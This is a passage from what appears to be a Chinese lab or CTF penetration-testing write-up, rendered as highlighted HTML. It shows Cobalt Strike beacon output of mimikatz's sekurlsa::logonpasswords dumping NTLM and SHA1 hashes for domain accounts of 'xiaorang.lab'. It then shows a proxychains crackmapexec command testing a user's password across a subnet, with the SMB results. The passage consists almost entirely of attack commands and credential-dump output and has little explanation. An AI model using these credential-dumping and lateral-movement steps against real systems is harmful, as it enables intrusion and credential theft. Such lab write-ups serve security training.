+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">[</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">*</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">] Tasked beacon to run mimikatz</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">s sekurlsa::logonpasswords command into 1928 (x64)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">[+] host called home, sent: 297602 bytes</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">[+] received output:</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Authentication Id : 0 ; 15467382 (00000000:00ec0376)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Session           : RemoteInteractive from 2</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">User Name         : Aldrich</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Domain            : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Server      : DC01</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Time        : 2023/7/30 17:28:43</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">SID               : S-1-5-21-3289074908-3315245560-3429321632-1105</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	msv :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 [00000003] Primary</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : Aldrich</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * NTLM     : e19ccf75ee54e06b06a5907af13cef42</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * DPAPI    : a3f0e6622289e7951e9a12b27368cda5</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	tspkg :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	wdigest :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : Aldrich</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	kerberos :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : Aldrich</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG.LAB</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	ssp :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	credman :</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Authentication Id : 0 ; 52967 (00000000:0000cee7)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Session           : Interactive from 1</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">User Name         : DWM-1</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Domain            : Window Manager</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Server      : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Time        : 2023/7/30 16:21:58</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">SID               : S-1-5-90-0-1</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	msv :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 [00000003] Primary</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * SHA1     : e06238ecefc14d675f762b08a456770dc000f763</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	tspkg :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	wdigest :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	kerberos :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : xiaorang.lab</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : ...... (略)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	ssp :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	credman :</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Authentication Id : 0 ; 52935 (00000000:0000cec7)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Session           : Interactive from 1</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">User Name         : DWM-1</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Domain            : Window Manager</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Server      : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Time        : 2023/7/30 16:21:58</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">SID               : S-1-5-90-0-1</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	msv :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 [00000003] Primary</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * NTLM     : 02b2a436556a3dd5d6638ad03f87c43e</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * SHA1     : c81ff31553d1e42093c29c46ed26bdca3257cc40</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	tspkg :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	wdigest :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	kerberos :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : xiaorang.lab</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : ...... (略)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	ssp :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	credman :</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Authentication Id : 0 ; 996 (00000000:000003e4)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Session           : Service from 0</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">User Name         : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Domain            : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Server      : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Time        : 2023/7/30 16:21:58</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">SID               : S-1-5-20</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	msv :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 [00000003] Primary</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * NTLM     : 02b2a436556a3dd5d6638ad03f87c43e</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * SHA1     : c81ff31553d1e42093c29c46ed26bdca3257cc40</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	tspkg :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	wdigest :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	kerberos :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : win2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG.LAB</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : ...... (略)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	ssp :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	credman :</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Authentication Id : 0 ; 23516 (00000000:00005bdc)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Session           : UndefinedLogonType from 0</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">User Name         : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Domain            : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Server      : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Time        : 2023/7/30 16:21:58</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">SID               :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	msv :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 [00000003] Primary</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * NTLM     : 02b2a436556a3dd5d6638ad03f87c43e</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * SHA1     : c81ff31553d1e42093c29c46ed26bdca3257cc40</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	tspkg :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	wdigest :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	kerberos :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	ssp :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	credman :</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Authentication Id : 0 ; 15442286 (00000000:00eba16e)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Session           : Interactive from 2</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">User Name         : DWM-2</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Domain            : Window Manager</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Server      : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Time        : 2023/7/30 17:28:42</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">SID               : S-1-5-90-0-2</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	msv :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 [00000003] Primary</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * NTLM     : 02b2a436556a3dd5d6638ad03f87c43e</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * SHA1     : c81ff31553d1e42093c29c46ed26bdca3257cc40</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	tspkg :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	wdigest :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	kerberos :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : xiaorang.lab</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : ...... (略)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	ssp :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	credman :</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Authentication Id : 0 ; 15442262 (00000000:00eba156)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Session           : Interactive from 2</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">User Name         : DWM-2</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Domain            : Window Manager</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Server      : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Time        : 2023/7/30 17:28:42</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">SID               : S-1-5-90-0-2</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	msv :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 [00000003] Primary</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * NTLM     : 02b2a436556a3dd5d6638ad03f87c43e</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * SHA1     : c81ff31553d1e42093c29c46ed26bdca3257cc40</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	tspkg :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	wdigest :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	kerberos :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : xiaorang.lab</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : ...... (略)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	ssp :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	credman :</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Authentication Id : 0 ; 995 (00000000:000003e3)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Session           : Service from 0</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">User Name         : IUSR</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Domain            : NT AUTHORITY</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Server      : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Time        : 2023/7/30 16:22:01</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">SID               : S-1-5-17</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	msv :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	tspkg :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	wdigest :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	kerberos :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	ssp :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	credman :</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Authentication Id : 0 ; 997 (00000000:000003e5)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Session           : Service from 0</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">User Name         : LOCAL SERVICE</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Domain            : NT AUTHORITY</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Server      : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Time        : 2023/7/30 16:21:59</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">SID               : S-1-5-19</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	msv :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	tspkg :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	wdigest :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	kerberos :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	ssp :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	credman :</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Authentication Id : 0 ; 999 (00000000:000003e7)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Session           : UndefinedLogonType from 0</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">User Name         : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Domain            : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Server      : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Logon Time        : 2023/7/30 16:21:58</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">SID               : S-1-5-18</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	msv :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	tspkg :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	wdigest :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : WIN2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	kerberos :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Username : win2016$</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Domain   : XIAORANG.LAB</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	 * Password : (null)</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	ssp :</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">	credman :</span></span></code></pre>
+<p>crackmapexec</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> proxychains</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> crackmapexec</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> smb</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -u</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Aldrich</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -p</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">P@ssw0rd</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -d</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> xiaorang.lab</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> 172.22.8.0/24</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">SMB</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">         172.22.8.46</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">     445</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    WIN2016</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">          [*] Windows Server 2016 Datacenter 14393 x64 (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">name:WIN2016</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">) (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">domain:xiaorang.lab</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">) (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">signing:False</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">) (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">SMBv1:True</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">SMB</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">         172.22.8.18</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">     445</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    WIN-WEB</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">          [*] Windows Server 2016 Datacenter 14393 x64 (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">name:WIN-WEB</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">) (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">domain:xiaorang.lab</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">) (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">signing:False</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">) (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">SMBv1:True</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
